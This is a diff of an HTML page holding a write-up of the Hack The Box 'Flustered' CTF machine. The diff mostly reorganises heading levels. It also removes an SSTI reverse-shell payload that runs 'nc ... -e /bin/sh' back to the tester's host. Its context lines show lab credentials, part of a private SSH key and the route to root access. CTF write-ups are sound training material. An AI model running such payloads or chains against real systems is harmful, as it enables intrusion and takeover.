@@ -98,13 +98,19 @@
             <div class="entry-content">
                 <ul id="toc" class="section-nav">
 <li class="toc-entry toc-h1"><a href="#summary">Summary</a></li>
-<li class="toc-entry toc-h1"><a href="#enumeration">Enumeration</a></li>
-<li class="toc-entry toc-h1"><a href="#glusterfs">Glusterfs</a></li>
-<li class="toc-entry toc-h1"><a href="#steampunk-erahtb---ssti-to-rce">steampunk-era.htb - SSTI to RCE</a></li>
-<li class="toc-entry toc-h1"><a href="#www-data-to-jennifer">www-data to jennifer</a></li>
-<li class="toc-entry toc-h1"><a href="#jennifer-to-root">Jennifer to Root</a></li>
-<li class="toc-entry toc-h1"><a href="#azurite">Azurite</a></li>
-<li class="toc-entry toc-h1"><a href="#keys-to-the-kingdom">Keys to the Kingdom</a></li>
+<li class="toc-entry toc-h1"><a href="#enumeration">Enumeration</a>
+<ul>
+<li class="toc-entry toc-h2"><a href="#glusterfs">Glusterfs</a></li>
+<li class="toc-entry toc-h2"><a href="#steampunk-erahtb---ssti-to-rce">steampunk-era.htb - SSTI to RCE</a></li>
+<li class="toc-entry toc-h2"><a href="#www-data-to-jennifer">www-data to jennifer</a></li>
+</ul>
+</li>
+<li class="toc-entry toc-h1"><a href="#jennifer-to-root">Jennifer to Root</a>
+<ul>
+<li class="toc-entry toc-h2"><a href="#azurite">Azurite</a></li>
+</ul>
+</li>
+<li class="toc-entry toc-h1"><a href="#keys-to-the-kingdom-root">Keys to the Kingdom (Root)</a></li>
 </ul><h1 id="summary">
 <a class="anchor" href="#summary" aria-hidden="true"><span class="octicon octicon-link"></span></a>Summary</h1>
 <p>Flustered was an easy machine from Hackthebox: Uni CTF Quals 2021. Starting by mounting a remote GlusterFS and extracting credentials within the volume. Using these credentials, Squid proxy can be acessed to access an internal web application that is vulnerable to SSTI. Once on the box, there is a Azurite docker container containing the root SSH key to get root access to the machine.</p>
@@ -153,8 +159,8 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 <p>Attempting to view pages or enumerate for other ports using Squid proxy does not work - this is likely because it requires credentials.</p>
 
-<h1 id="glusterfs">
-<a class="anchor" href="#glusterfs" aria-hidden="true"><span class="octicon octicon-link"></span></a>Glusterfs</h1>
+<h2 id="glusterfs">
+<a class="anchor" href="#glusterfs" aria-hidden="true"><span class="octicon octicon-link"></span></a>Glusterfs</h2>
 
 <p>When googling for the port <code class="language-plaintext highlighter-rouge">24007</code>, a <a href="https://access.redhat.com/documentation/en-us/red_hat_gluster_storage/3.3/html/container-native_storage_for_openshift_container_platform/crs_port_access">RedHat documentation</a> suggests that GlusterFS is running on the machine and the ports nmap identified as <code class="language-plaintext highlighter-rouge">rpcbind</code> are used by GlusterFS.</p>
 
@@ -235,8 +241,8 @@ aria_log_control   ib_buffer_pool    ib_logfile0  ibtmp1       mysql		  performa
 <span class="s">http 10.129.96.25 3128 lance.friedman o&gt;WJ5-jD&lt;5^m3</span>
 </code></pre></div></div>
 
-<h1 id="steampunk-erahtb---ssti-to-rce">
-<a class="anchor" href="#steampunk-erahtb---ssti-to-rce" aria-hidden="true"><span class="octicon octicon-link"></span></a>steampunk-era.htb - SSTI to RCE</h1>
+<h2 id="steampunk-erahtb---ssti-to-rce">
+<a class="anchor" href="#steampunk-erahtb---ssti-to-rce" aria-hidden="true"><span class="octicon octicon-link"></span></a>steampunk-era.htb - SSTI to RCE</h2>
 <p>I can route automated fuzzing tools through squid proxy to enumerate the web application. This can take a while but amoung the results are:</p>
 
 <p><img src="https://i.imgur.com/NCQK09j.png" alt="webscan.png"></p>
@@ -288,7 +294,7 @@ aria_log_control   ib_buffer_pool    ib_logfile0  ibtmp1       mysql		  performa
 
 <div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
   </span><span class="nl">"sitename"</span><span class="p">:</span><span class="w"> </span><span class="s2">"anything"</span><span class="p">,</span><span class="w">
-  </span><span class="nl">"siteurl"</span><span class="p">:</span><span class="s2">"</span><span class="se">\{\{</span><span class="s2">7*7</span><span class="se">\}\}</span><span class="s2">"</span><span class="w">
+  </span><span class="nl">"siteurl"</span><span class="p">:</span><span class="s2">""</span><span class="w">
 </span><span class="p">}</span><span class="w">
 </span></code></pre></div></div>
 <p>Assuming the rest of the http request is correct (likely have to change content-type to <code class="language-plaintext highlighter-rouge">application/json</code>), this returns:</p>
@@ -297,11 +303,11 @@ aria_log_control   ib_buffer_pool    ib_logfile0  ibtmp1       mysql		  performa
 
 <p>So the SSTI works. Using a reverse shell payload (I initially used <code class="language-plaintext highlighter-rouge">/bin/bash</code> but had errors which <code class="language-plaintext highlighter-rouge">sh</code> seemed to solve):</p>
 
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\<span class="p">{</span>\<span class="p">{</span> <span class="n">request</span><span class="p">[</span><span class="s">'application'</span><span class="p">][</span><span class="s">'__globals__'</span><span class="p">][</span><span class="s">'__builtins__'</span><span class="p">][</span><span class="s">'__import__'</span><span class="p">](</span><span class="s">'os'</span><span class="p">)[</span><span class="s">'popen'</span><span class="p">](</span><span class="s">'nc 10.10.14.2 9919 -e /bin/sh'</span><span class="p">)[</span><span class="s">'read'</span><span class="p">]()</span> \<span class="p">}</span>\<span class="p">}</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
 </code></pre></div></div>
 
-<h1 id="www-data-to-jennifer">
-<a class="anchor" href="#www-data-to-jennifer" aria-hidden="true"><span class="octicon octicon-link"></span></a>www-data to jennifer</h1>
+<h2 id="www-data-to-jennifer">
+<a class="anchor" href="#www-data-to-jennifer" aria-hidden="true"><span class="octicon octicon-link"></span></a>www-data to jennifer</h2>
 <p>I can get a shell as <code class="language-plaintext highlighter-rouge">www-data</code>. After lots more enumeration, and remembering the previous <code class="language-plaintext highlighter-rouge">volume info</code> of glusterfs, it’s apparent that keys in <code class="language-plaintext highlighter-rouge">/etc/ssl</code> can be listed:</p>
 
 <p><img src="https://i.imgur.com/1xgbAZG.png" alt="keys.png"></p>
@@ -389,8 +395,8 @@ Time:2021-11-25T14:38:28.694Z&lt;/Message&gt;
 
 <p><code class="language-plaintext highlighter-rouge">ssh jennifer@flustered.htb -L 10000:172.17.0.2:10000</code></p>
 
-<h1 id="azurite">
-<a class="anchor" href="#azurite" aria-hidden="true"><span class="octicon octicon-link"></span></a>Azurite</h1>
+<h2 id="azurite">
+<a class="anchor" href="#azurite" aria-hidden="true"><span class="octicon octicon-link"></span></a>Azurite</h2>
 <p>We can now access this service from our own machine. We can use the following script to enumerate the service and download files (requires <code class="language-plaintext highlighter-rouge">pip install azure-blob-storage</code>). The connection string is from the <a href="https://github.com/Azure/Azurite#default-storage-account">Azurite GitHub</a> and specifies the AccountKey found in <code class="language-plaintext highlighter-rouge">/var/backups/key</code>:</p>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">azure.storage.blob</span> <span class="kn">import</span> <span class="n">BlobServiceClient</span><span class="p">,</span> <span class="n">BlobClient</span><span class="p">,</span> <span class="n">ContainerClient</span><span class="p">,</span> <span class="n">__version__</span>
@@ -450,8 +456,8 @@ NhAAAAAwEAAQAAAQEAvrfifWpWEAtxdHG7wTIqLGYPJo3TJ/+HzrrYHyzDBADpNEl2U+vi
 NYW2N69F6n0Yjd7XZox69xb4AG0FOe6/SEXi+e960L023luJ7UUaJUxravi4BqAPabiZ5Q
 </code></pre></div></div>
 
-<h1 id="keys-to-the-kingdom">
-<a class="anchor" href="#keys-to-the-kingdom" aria-hidden="true"><span class="octicon octicon-link"></span></a>Keys to the Kingdom</h1>
+<h1 id="keys-to-the-kingdom-root">
+<a class="anchor" href="#keys-to-the-kingdom-root" aria-hidden="true"><span class="octicon octicon-link"></span></a>Keys to the Kingdom (Root)</h1>
 <p>Finally, we can login as root with SSH:</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh -i root.key root@flustered.htb
